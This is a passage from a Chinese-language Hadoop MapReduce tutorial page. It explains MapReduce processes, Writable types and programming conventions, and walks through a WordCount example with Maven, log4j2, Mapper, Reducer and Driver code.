src="/2020/11/12/bigdata-mapreduce1-setup/1638342393148.png" alt="1638342393148">              </p><p>（1）分布式的运算程序往往需要分成至少2个阶段。</p><p>（2）第一个阶段的MapTask并发实例，完全并行运行，互不相干。</p><p>（3）第二个阶段的ReduceTask并发实例互不相干，但是他们的数据依赖于上一个阶段的所有MapTask并发实例的输出。</p><p>（4）MapReduce编程模型只能包含一个Map阶段和一个Reduce阶段，如果用户的业务逻辑非常复杂，那就只能多个MapReduce程序，串行运行。</p><p>总结：分析WordCount数据流走向深入理解MapReduce核心思想。</p><h2 id="1-4-MapReduce进程"><a href="#1-4-MapReduce进程" class="headerlink" title="1.4 MapReduce进程"></a>1.4 MapReduce进程</h2><p>一个完整的MapReduce程序在分布式运行时有三类实例进程：</p><p>（1）MrAppMaster：负责整个程序的过程调度及状态协调。</p><p>（2）MapTask：负责Map阶段的整个数据处理流程。</p><p>（3）ReduceTask：负责Reduce阶段的整个数据处理流程。</p><h2 id="1-5-官方WordCount源码"><a href="#1-5-官方WordCount源码" class="headerlink" title="1.5 官方WordCount源码"></a>1.5 官方WordCount源码</h2><p>采用反编译工具反编译源码，发现WordCount案例有Map类、Reduce类和驱动类。且数据的类型是Hadoop自身封装的序列化类型。</p><h2 id="1-6-常用数据序列化类型"><a href="#1-6-常用数据序列化类型" class="headerlink" title="1.6 常用数据序列化类型"></a>1.6 常用数据序列化类型</h2><table><thead><tr><th>Java类型</th><th>Hadoop Writable类型</th></tr></thead><tbody><tr><td>Boolean</td><td>BooleanWritable</td></tr><tr><td>Byte</td><td>ByteWritable</td></tr><tr><td>Int</td><td>IntWritable</td></tr><tr><td>Float</td><td>FloatWritable</td></tr><tr><td>Long</td><td>LongWritable</td></tr><tr><td>Double</td><td>DoubleWritable</td></tr><tr><td>String</td><td>Text</td></tr><tr><td>Map</td><td>MapWritable</td></tr><tr><td>Array</td><td>ArrayWritable</td></tr><tr><td>Null</td><td>NullWritable</td></tr></tbody></table><h2 id="1-7-MapReduce编程规范"><a href="#1-7-MapReduce编程规范" class="headerlink" title="1.7 MapReduce编程规范"></a>1.7 MapReduce编程规范</h2><p>用户编写的程序分成三个部分：Mapper、Reducer和Driver。</p><h3 id="1-7-1-Mapper阶段"><a href="#1-7-1-Mapper阶段" class="headerlink" title="1.7.1 Mapper阶段"></a>1.7.1 Mapper阶段</h3><p>（1）用户自定义的Mapper要继承自己的父类</p><p>（2）Mapper的输入数据是KV对的形式</p><p>（3）Mapper中的业务逻辑编写在map()方法中</p><p>（4）Mapper的输出数据是KV对的形式</p><p><strong>（5）map()方法（MapTask进程）对每一个&lt;K,V&gt;调用一次</strong></p><h3 id="1-7-2-Reducer阶段"><a href="#1-7-2-Reducer阶段" class="headerlink" title="1.7.2 Reducer阶段"></a>1.7.2 Reducer阶段</h3><p>（1）用户自定义的Reducer要继承自己的父类</p><p>（2）Reducer的输入数据是Mapper的输出数据类型</p><p>（3）Reducer中的业务逻辑编写在reduce()方法中</p><p>（4）Mapper的输出数据是KV对的形式</p><p><strong>（5）ReduceTask进程对每一组仙童的&lt;K,V&gt;调用reduce()一次</strong></p><h3 id="1-7-3-Driver阶段"><a href="#1-7-3-Driver阶段" class="headerlink" title="1.7.3 Driver阶段"></a>1.7.3 Driver阶段</h3><p>相当于YARN集群的客户端，用于提交我们整个程序到YARN，提交的是封装了MapReduce程序相关运行参数的job对象。</p><h2 id="1-8-WordCount案例实操"><a href="#1-8-WordCount案例实操" class="headerlink" title="1.8 WordCount案例实操"></a>1.8 WordCount案例实操</h2><p><strong>1）需求</strong></p><p>在给定的文本文件中统计输出每一个单词出现的总次数</p><p>（1）输入数据</p><p>​               <img src="/2020/11/12/bigdata-mapreduce1-setup/1638342710639.png" alt="1638342710639">                 </p><p>（2）期望输出数据</p><p>molly  2</p><p>banzhang 1</p><p>cls  2</p><p>hadoop  1</p><p>jiao 1</p><p>ss   2</p><p>xue 1</p><p><strong>2）需求分析</strong></p><p>按照MapReduce编程规范，分别编写Mapper，Reducer，Driver。</p><p><img src="/2020/11/12/bigdata-mapreduce1-setup/1638342700100.png" alt="1638342700100"><br>3）环境准备<br>（1）创建maven工程<br>（2）在pom.xml文件中添加如下依赖</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-slf4j-impl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.12.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.hadoop<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>hadoop-client<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.1.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）在项目的src/main/resources目录下，新建一个文件，命名为“log4j2.xml”，在文件中填入。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span> <span class="token attr-name">strict</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>XMLConfig<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 类型名为Console，名称为必须属性 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appender</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>STDOUT<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token comment" spellcheck="true">&lt;!-- 布局为PatternLayout的方式，            输出样式为[INFO] [2018-01-22 17:34:01][org.test.Console]I'm here --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Layout</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PatternLayout<span class="token punctuation">"</span></span>                    <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>[%p] [%d&amp;#123;yyyy-MM-dd HH:mm:ss&amp;#125;][%c&amp;#123;10&amp;#125;]%m%n<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appender</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Loggers</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 可加性为false --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Logger</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span> <span class="token attr-name">additivity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>STDOUT<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Logger</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- root loggerConfig设置 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>STDOUT<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Loggers</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4）编写程序<br>（1）编写Mapper类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>mapreduce<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IntWritable<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>LongWritable<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Mapper<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WordcountMapper</span> <span class="token keyword">extends</span> <span class="token class-name">Mapper</span><span class="token operator">&lt;</span>LongWritable<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> IntWritable<span class="token operator">></span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    Text k <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    IntWritable v <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IntWritable</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">map</span><span class="token punctuation">(</span>LongWritable key<span class="token punctuation">,</span> Text value<span class="token punctuation">,</span> Context context<span class="token punctuation">)</span>    <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 获取一行</span>        String line <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 切割</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> words <span class="token operator">=</span> line<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3 输出</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>String word <span class="token operator">:</span> words<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            k<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">;</span>            context<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）编写Reducer类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>wordcount<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IntWritable<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Reducer<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WordcountReducer</span> <span class="token keyword">extends</span> <span class="token class-name">Reducer</span><span class="token operator">&lt;</span>Text<span class="token punctuation">,</span> IntWritable<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> IntWritable<span class="token operator">></span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">int</span> sum<span class="token punctuation">;</span>IntWritable v <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IntWritable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">reduce</span><span class="token punctuation">(</span>Text key<span class="token punctuation">,</span> Iterable<span class="token operator">&lt;</span>IntWritable<span class="token operator">></span> values<span class="token punctuation">,</span>Context context<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 累加求和</span>        sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>IntWritable count <span class="token operator">:</span> values<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            sum <span class="token operator">+=</span> count<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 输出</span>         v<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>        context<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）编写Driver驱动类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>wordcount<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>Path<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IntWritable<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Text<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>Job<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>input<span class="token punctuation">.</span>FileInputFormat<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>mapreduce<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>output<span class="token punctuation">.</span>FileOutputFormat<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WordcountDriver</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 获取配置信息以及获取job对象</span>        Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Job job <span class="token operator">=</span> Job<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 关联本Driver程序的jar</span>        job<span class="token punctuation">.</span><span class="token function">setJarByClass</span><span class="token punctuation">(</span>WordcountDriver<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3 关联Mapper和Reducer的jar</span>        job<span class="token punctuation">.</span><span class="token function">setMapperClass</span><span class="token punctuation">(</span>WordcountMapper<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setReducerClass</span><span class="token punctuation">(</span>WordcountReducer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 4 设置Mapper输出的kv类型</span>        job<span class="token punctuation">.</span><span class="token function">setMapOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setMapOutputValueClass</span><span class="token punctuation">(</span>IntWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 5 设置最终输出kv类型</span>        job<span class="token punctuation">.</span><span class="token function">setOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setOutputValueClass</span><span class="token punctuation">(</span>IntWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 6 设置输入和输出路径</span>        FileInputFormat<span class="token punctuation">.</span><span class="token function">setInputPaths</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileOutputFormat<span class="token punctuation">.</span><span class="token function">setOutputPath</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 7 提交job</span>        <span class="token keyword">boolean</span> result <span class="token operator">=</span> job<span class="token punctuation">.</span><span class="token function">waitForCompletion</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>result <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）本地测试<br>（1）需要首先配置好HADOOP_HOME变量以及Windows运行依赖<br>（2）在IDEA/Eclipse上运行程序<br>6）集群上测试<br>（0）用maven打jar包，需要添加的打包插件依赖</p><pre class="line-numbers language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-compiler-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.6.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>source</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">></span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-assembly-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRefs</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>descriptorRef</span><span class="token punctuation">></span></span>jar-with-dependencies<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRef</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRefs</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>make-assembly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase</span><span class="token punctuation">></span></span>package<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>phase</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">></span></span>single<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span><span aria-hidden="true" 